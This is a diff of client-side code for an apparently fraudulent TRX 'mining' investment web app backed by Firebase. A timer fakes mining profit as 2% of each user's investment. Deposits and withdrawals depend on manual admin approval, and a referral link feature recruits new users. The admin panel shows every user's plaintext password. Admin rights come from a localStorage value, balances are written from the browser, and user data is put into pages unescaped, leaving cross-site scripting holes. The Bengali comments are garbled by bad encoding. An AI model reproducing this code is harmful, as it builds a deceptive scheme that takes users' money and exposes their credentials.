+                btn.className = "w-full bg-red-500 text-white font-bold text-xs py-2.5 rounded-lg shadow-md cursor-pointer";
+                icon.classList.add('animate-spin', 'text-red-500');
+
+                let maxDailyProfit = currentUser.investment * 0.02; 
+                let increment = maxDailyProfit / 120; 
+
+                miningInterval = setInterval(() => {
+                    todayMined += increment;
+                    document.getElementById('minedAmount').innerText = todayMined.toFixed(6);
+                }, 1000);
+            }
+        }
+
+        function submitDeposit() {
+            const amount = document.getElementById('depositAmountField').value;
+            const txid = document.getElementById('txIdField').value.trim();
+            if(!amount || !txid) { alert('Please fill in deposit amount and TxID!'); return; }
+            database.ref('deposits/').push({ username: currentUser.username, amount: amount, txid: txid, time: new Date().toLocaleString() });
+            alert('Deposit submitted! Contact Admin with your TxID for quick approval.');
+            document.getElementById('depositAmountField').value = '';
+            document.getElementById('txIdField').value = '';
+            showPage('homePage');
+        }
+
+        function submitWithdraw() {
+            const addr = document.getElementById('withdrawAddress').value.trim();
+            const amt = parseFloat(document.getElementById('withdrawAmount').value);
+            if(!addr || isNaN(amt) || amt <= 0) { alert('Enter valid details!'); return; }
+            if(currentUser.balance < amt) { alert('Insufficient balance!'); return; }
+
+            let remBal = currentUser.balance - amt;
+            database.ref('users/' + currentUser.username).update({ balance: remBal });
+            database.ref('withdraws/').push({ username: currentUser.username, address: addr, amount: amt, time: new Date().toLocaleString() });
+            alert('Withdraw request logged! Admin will process within 24 hours.');
+            document.getElementById('withdrawAddress').value = '';
+            document.getElementById('withdrawAmount').value = '';
+        }
+
+        function toggleBlockUser(username, currentBlockStatus) {
+            const targetStatus = !currentBlockStatus;
+            const actionWord = targetStatus ? "BLOCK" : "UNBLOCK";
+            if(confirm(`Are you sure you want to ${actionWord} ${username}?`)) {
+                database.ref('users/' + username).update({ isBlocked: targetStatus });
+                alert(`User ${username} has been ${actionWord}ED.`);
+            }
+        }
+
+        function loadAdminMonitor() {
+            database.ref('users').on('value', snapshot => {
+                const container = document.getElementById('adminUserListContainer');
+                container.innerHTML = '';
+                if(snapshot.exists()) {
+                    snapshot.forEach(child => {
+                        let data = child.val();
+                        let isBlocked = data.isBlocked || false;
+                        let blockBtnText = isBlocked ? "Unblock" : "Block User";
+                        let blockBtnColor = isBlocked ? "bg-green-600 hover:bg-green-700" : "bg-red-600 hover:bg-red-700";
+                        
+                        container.innerHTML += `
+                            <div class="bg-[#121826] p-3 rounded-lg border border-gray-800 flex justify-between items-center text-xs">
+                                <div>
+                                    <p class="text-white font-bold">User: ${data.username} ${isBlocked ? '<span class="text-red-500 font-normal">(Blocked)</span>':''}</p>
+                                    <p class="text-gray-400">Pass: ${data.password}</p>
+                                    <button onclick="toggleBlockUser('${data.username}', ${isBlocked})" class="mt-2 text-[10px] text-white px-2 py-1 rounded font-semibold transition ${blockBtnColor}">
+                                        ${blockBtnText}
+                                    </button>
+                                </div>
+                                <div class="text-right">
+                                    <p class="text-red-500 font-mono">${parseFloat(data.balance).toFixed(2)} TRX</p>
+                                    <p class="text-green-400 text-[10px]">Inv: ${parseFloat(data.investment).toFixed(0)}</p>
+                                </div>
+                            </div>`;
+                    });
+                } else { container.innerHTML = `<p class="text-xs text-gray-500">No users found.</p>`; }
+            });
+        }
+// à¦‰à¦‡à¦¥à¦¡à§à¦° à¦°à¦¿à¦•à§‹à§Ÿà§‡à¦¸à§à¦Ÿ à¦²à§‹à¦¡ à¦•à¦°à¦¾à¦° à¦«à¦¾à¦‚à¦¶à¦¨
+database.ref('withdraws').on('value', snapshot => {
+    const container = document.getElementById('withdrawRequestContainer');
+    if (!container) return;
+    container.innerHTML = ''; 
+    snapshot.forEach(child => {
+        let req = child.val();
+        if(req.status !== 'success') {
+            container.innerHTML += `
+                <div class="bg-[#121826] p-3 rounded-lg border border-gray-800 text-xs flex justify-between items-center">
+                    <div>
+                        <p class="text-white font-bold">User: ${req.username}</p>
+                        <p class="text-red-400">${req.amount} TRX</p>
+                        <p class="text-gray-500 break-all">${req.address}</p>
+                    </div>
+                    <button onclick="approveWithdraw('${child.key}')" class="bg-green-600 px-3 py-1 rounded text-white font-bold cursor-pointer">Approve</button>
+                </div>`;
+        }
+    });
+});
+
+// à¦…à§à¦¯à¦¾à¦ªà§à¦°à§à¦­ à¦•à¦°à¦¾à¦° à¦«à¦¾à¦‚à¦¶à¦¨
+function approveWithdraw(key) {
+    if(confirm('Are you sure you want to approve this withdrawal?')) {
+        database.ref('withdraws/' + key).update({ status: 'success' });
+        alert('Withdrawal Approved successfully!');
+    }
+}
+
+        function adminModifyBalance(isAdd) {
+            const user = document.getElementById('admTargetUser').value.trim().toLowerCase();
+            const amt = parseFloat(document.getElementById('admAmount').value);
+            if(!user || isNaN(amt)) { alert('Fill all fields correctly!'); return; }
+
+            database.ref('users/' + user).once('value', snapshot => {
+                if(!snapshot.exists()) { alert('User does not exist!'); return; }
+                let currentBal = parseFloat(snapshot.val().balance);
+                let targetNewBal = isAdd ? (currentBal + amt) : (currentBal - amt);
+                if (targetNewBal < 0) targetNewBal = 0;
+
+                database.ref('users/' + user).update({ balance: targetNewBal });
+                alert('User balance updated successfully!');
+                document.getElementById('admTargetUser').value = '';
+                document.getElementById('admAmount').value = '';
+            });
+        }
+
+        function openProfilePage() {
+            if(!currentUser) return;
+            document.getElementById('profileUsernameDisplay').innerText = currentUser.username;
+            updateUI();
+            showPage('profilePage');
+        }
+
+        function updateProfilePicture() {
+            if(!currentUser) return;
+            const picURL = document.getElementById('propicURLField').value.trim();
+            if(!picURL) { alert('Please paste a valid image URL!'); return; }
+
+            database.ref('users/' + currentUser.username).update({ profilePic: picURL });
+            alert('Profile Picture Updated Successfully!');
+            document.getElementById('propicURLField').value = '';
+        }
+
+        function copyAddress() {
+            navigator.clipboard.writeText(document.getElementById('trxAddressText').innerText);
+            alert('TRX Address copied!');
+        }
+
+        function logout() {
+            if(currentUser) database.ref('users/' + currentUser.username).off();
+            database.ref('users').off();
+            currentUser = null;
+            localStorage.removeItem('easyEarningUser');
+            if(miningInterval) { clearInterval(miningInterval); miningInterval = null; }
+            document.getElementById('logUser').value = '';
+            document.getElementById('logPass').value = '';
+            showPage('loginPage');
+        }
+
+        // AUTO-LOGIN INITIALIZATION
+        window.addEventListener('DOMContentLoaded', () => {
+            const savedUser = localStorage.getItem('easyEarningUser');
+            if(savedUser) {
+                if(savedUser === 'admin') {
+                    loadAdminMonitor();
+                    showPage('adminPanelPage');
+                } else {
+                    database.ref('users/' + savedUser).once('value', snapshot => {
+                        if(snapshot.exists()) {
+                            let uData = snapshot.val();
+                            if(uData.isBlocked) {
+                                showPage('blockScreen');
+                            } else {
+                                startUserSync(savedUser);
+                            }
+                        } else {
+                            logout();
+                        }
+                    });
+                }
+            }
+    });
+    // à¦‡à¦‰à¦œà¦¾à¦° à¦¯à¦–à¦¨ à¦†à¦ªà¦¨à¦¾à¦° à¦²à¦¿à¦™à§à¦•à§‡ à¦•à§à¦²à¦¿à¦• à¦•à¦°à§‡ à¦†à¦¸à¦¬à§‡, à¦à¦‡ à¦•à§‹à¦¡à¦Ÿà¦¿ à¦°à§‡à¦«à¦¾à¦°à§‡à¦² à¦•à§‹à¦¡ à¦§à¦°à§‡ à¦‡à¦¨à¦ªà§à¦Ÿ à¦¬à¦•à§à¦¸à§‡ à¦¬à¦¸à¦¿à§Ÿà§‡ à¦¦à§‡à¦¬à§‡
+const urlParams = new URLSearchParams(window.location.search);
+const refCode = urlParams.get('ref');
+
+if (refCode) {
+    const refInput = document.getElementById('regReferrer'); // à¦†à¦ªà¦¨à¦¾à¦° à¦°à§‡à¦«à¦¾à¦°à§‡à¦² à¦•à§‹à¦¡ à¦‡à¦¨à¦ªà§à¦Ÿà§‡à¦° id
+    if (refInput) {
+        refInput.value = refCode; // à¦°à§‡à¦«à¦¾à¦°à§‡à¦² à¦•à§‹à¦¡ à¦…à¦Ÿà§‹à¦®à§‡à¦Ÿà¦¿à¦• à¦˜à¦°à§‡ à¦¬à¦¸à¦¾à¦¬à§‡
+        refInput.readOnly = true; // à¦‡à¦‰à¦œà¦¾à¦° à¦¯à¦¾à¦¤à§‡ à¦à¦Ÿà¦¾ à¦®à§à¦›à§‡ à¦«à§‡à¦²à¦¤à§‡ à¦¨à¦¾ à¦ªà¦¾à¦°à§‡
+    }
+}
+
+    // à¦¨à¦¤à§à¦¨ à¦«à¦¾à¦‚à¦¶à¦¨à¦—à§à¦²à§‹ à¦à¦–à¦¾à¦¨à§‡ à¦¬à¦¸à¦¾à¦¨
+    function showPage(pageId) {
+        document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
+        const targetPage = document.getElementById(pageId);
+        if(targetPage) targetPage.classList.add('active')
+        if (pageId === 'historyPage') {
+    loadHistory();
+}
+        if(pageId === 'teamPage' && currentUser) {
+            const refUrl = window.location.origin + window.location.pathname + "?ref=" + currentUser.username;
+            document.getElementById('myRefLink').value = refUrl;
+        }
+    }
+    function loadHistory() {
+    const historyList = document.getElementById('historyList');
+    if (!historyList) return;
+    
+    database.ref('users/' + currentUser + '/history').once('value').then(function(snapshot) {
+        historyList.innerHTML = ''; //
+        if (snapshot.exists()) {
+            snapshot.forEach(function(childSnapshot) {
+                let data = childSnapshot.val();
+                historyList.innerHTML += `
+                    <div class="bg-[#1a2236] p-4 rounded-xl border border-gray-700 flex justify-between items-center mb-2">
+                        <span class="text-white text-sm">${data.type}</span>
+                        <span class="text-green-500 text-sm font-bold">${data.amount} TRX</span>
+                    </div>
+                `;
+            });
+        } else {
+            historyList.innerHTML = '<p class="text-gray-400 text-center">No history available</p>';
+        }
+    });
+}
+</script>
+</body>
+</html>
